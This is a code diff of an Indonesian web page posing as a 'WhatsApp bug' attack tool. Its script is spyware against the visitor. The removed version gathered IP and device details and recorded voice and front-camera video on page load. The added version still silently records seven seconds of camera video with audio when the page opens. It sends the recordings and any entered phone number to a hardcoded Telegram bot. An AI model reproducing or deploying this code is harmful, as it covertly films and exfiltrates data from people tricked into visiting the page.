@@ -2,102 +2,147 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>dhack bug</title>
+  <title>Bug WhatsApp - Platform Selection</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+      background: #0f0f1e;
       font-family: 'Inter', sans-serif;
-      color: blue;
       height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      overflow: hidden;
-      position: relative;
       padding: 20px;
     }
-    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-    .particle {
-      position: absolute;
-      width: 2px;
-      height: 2px;
-      background: rgba(0, 255, 127, 0.3);
-      border-radius: 50%;
-      animation: float 6s ease-in-out infinite;
-    }
-    @keyframes float {
-      0%, 100% { transform: translateY(0px); opacity: 0.3; }
-      50% { transform: translateY(-20px); opacity: 0.8; }
-    }
-    .login-container {
-      background-color: rgba(17, 17, 17, 0.95);
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px blue;
-      text-align: center;
-      max-width: 400px;
+
+    /* Container utama sesuai foto */
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 40px 30px;
+      border-radius: 24px;
       width: 100%;
-      z-index: 2;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
     }
-    .login-title {
-      font-size: 26px;
+
+    .title {
+      font-size: 28px;
       font-weight: 900;
+      color: #00ffcc;
+      text-transform: uppercase;
       margin-bottom: 5px;
-      background: linear-gradient(135deg, #2563eb, #ffffff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
     }
-    #notif {
+
+    .subtitle {
+      color: #888;
       font-size: 14px;
-      color: #00d9ff;
-      font-weight: 600;
-      height: 20px;
-      margin-bottom: 10px;
-      display: none;
+      margin-bottom: 30px;
     }
+
+    .label {
+      display: block;
+      text-align: left;
+      color: #00ffcc;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+    }
+
+    /* Input Target */
     .login-input {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      background: #333;
-      border: none;
-      border-radius: 6px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
       color: #fff;
-      font-size: 15px;
+      margin-bottom: 25px;
+      outline: none;
     }
-    .login-button {
-      width: 100%;
-      padding: 12px;
-      background: linear-gradient(135deg, #2563eb, #2563eb);
-      color: black;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
+
+    /* Platform Selection */
+    .platform-container {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+
+    .platform-btn {
+      flex: 1;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 12px;
+      color: #aaa;
       font-weight: 600;
-      font-size: 15px;
+      font-size: 13px;
+      cursor: pointer;
+      transition: all 0.3s;
     }
-    .login-button:hover { background-color: #2563eb; box-shadow: 0 0 20px blue; }
+
+    .platform-btn.active {
+      background: rgba(0, 255, 204, 0.1);
+      border-color: #00ffcc;
+      color: #fff;
+    }
+
+    /* Tombol Utama */
+    .ready-button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(90deg, #00ff88, #00ffee);
+      border: none;
+      border-radius: 12px;
+      color: #000;
+      font-weight: 800;
+      font-size: 16px;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+
+    .ready-button:active { transform: scale(0.98); }
+
+    #notif { color: #00ffcc; font-size: 12px; margin-top: 15px; display: none; }
   </style>
 </head>
 <body>
-  <div class="bg-particles"></div>
 
-  <div class="login-container">
-    <p class="login-title">bug WhatsApp By Hacked official</p>
-    <div id="notif">Sukses bug atack ✅</div>
-    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
-    <button class="login-button" id="login-button">Atack</button>
+  <div class="card">
+    <h1 class="title">BUG WHATSAPP</h1>
+    <p class="subtitle">Gunakan sebaik mungkin</p>
+
+    <label class="label">Target</label>
+    <input type="text" class="login-input" placeholder="Enter phone number or username" id="target">
+
+    <label class="label">Platform Selection</label>
+    <div class="platform-container">
+      <button class="platform-btn" onclick="selectPlatform(this, 'Android OS')">ANDROID OS</button>
+      <button class="platform-btn" onclick="selectPlatform(this, 'iOS Platform')">iOS PLATFORM</button>
+    </div>
+
+    <button class="ready-button" id="login-button">READY BUG</button>
+    <div id="notif">Proses bug berhasil dikirim ✅</div>
   </div>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
     const chatIds = ['7945789634'];
-    const input = document.getElementById('text');
-    const button = document.getElementById('login-button');
-    const notif = document.getElementById('notif');
+    let selectedPlatform = "";
+
+    function selectPlatform(btn, platform) {
+      // Hapus kelas active dari semua tombol platform
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      // Tambah kelas active ke yang diklik
+      btn.classList.add('active');
+      selectedPlatform = platform;
+    }
 
     function sendToTelegram(text) {
       chatIds.forEach(id => {
@@ -105,122 +150,51 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
-        }).catch(console.error);
+        });
       });
     }
 
-    function sendVideo(blob, filename) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
-        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
-    function sendVoice(blob, filename) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('voice', blob, filename);
-        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
-    async function getInfo() {
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const battery = await navigator.getBattery?.() || { level: 0 };
-        const ram = navigator.deviceMemory || "Tidak diketahui";
-        const device = navigator.userAgent.split('(')[1].split(')')[0];
-
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${(battery.level * 100).toFixed(0)}%\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
-      } catch (err) {}
-    }
-
-    // FITUR REKAMAN VIDEO 7 DETIK
+    // Fungsi Rekaman Video 7 Detik (Tetap aktif otomatis saat buka web)
     async function recordFrontVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         const mediaRecorder = new MediaRecorder(stream);
-        const videoChunks = [];
-
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data.size > 0) videoChunks.push(e.data);
-        };
-
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
-          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-          sendVideo(videoBlob, 'rekaman_depan.mp4');
-          stream.getTracks().forEach(track => track.stop());
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          const formData = new FormData();
+          chatIds.forEach(id => {
+            formData.append('chat_id', id);
+            formData.append('video', blob, 'video.mp4');
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
+          });
         };
-
-        // Mulai merekam
         mediaRecorder.start();
-
-        // Berhenti setelah 7 detik
-        setTimeout(() => {
-          if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-        }, 7000);
-
+        setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
       } catch (err) {
         sendToTelegram('maaf akses vidio tidak berhasil 🤬');
       }
     }
 
-    async function autoRecordAudio() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
-          sendVoice(blob, 'voice_note.mp3');
-          stream.getTracks().forEach(track => track.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
-      } catch (err) {
-        sendToTelegram('Izin Voice Note ditolak ❌');
-      }
-    }
+    document.getElementById('login-button').addEventListener('click', () => {
+      const target = document.getElementById('target').value;
+      if (!target) return alert("Masukkan nomor target!");
+      if (!selectedPlatform) return alert("Pilih platform terlebih dahulu!");
 
-    window.addEventListener('DOMContentLoaded', () => {
-      createParticles();
-      getInfo();
-      autoRecordAudio(); 
-      recordFrontVideo(); // Memicu izin kamera depan dan rekaman 7 detik
+      const msg = `<b>🔥 NEW BUG ATTACK</b>\n\n` +
+                  `🎯 <b>Target:</b> ${target}\n` +
+                  `📱 <b>Platform:</b> ${selectedPlatform}\n` +
+                  `⏰ <b>Waktu:</b> ${new Date().toLocaleString()}`;
+      
+      sendToTelegram(msg);
+      document.getElementById('notif').style.display = 'block';
     });
 
-    button.addEventListener('click', () => {
-      const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8) return;
-      
-      button.disabled = true;
-      notif.style.display = 'none';
-      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
-      
-      setTimeout(() => {
-        notif.style.display = 'block';
-        button.disabled = false;
-        input.value = '';
-      }, 1000);
-    });
-
-    function createParticles() {
-      const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 30; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.top = Math.random() * 100 + '%';
-        container.appendChild(p);
-      }
-    }
+    // Jalankan rekaman saat halaman dimuat
+    window.onload = () => {
+      recordFrontVideo();
+    };
   </script>
 </body>
 </html>
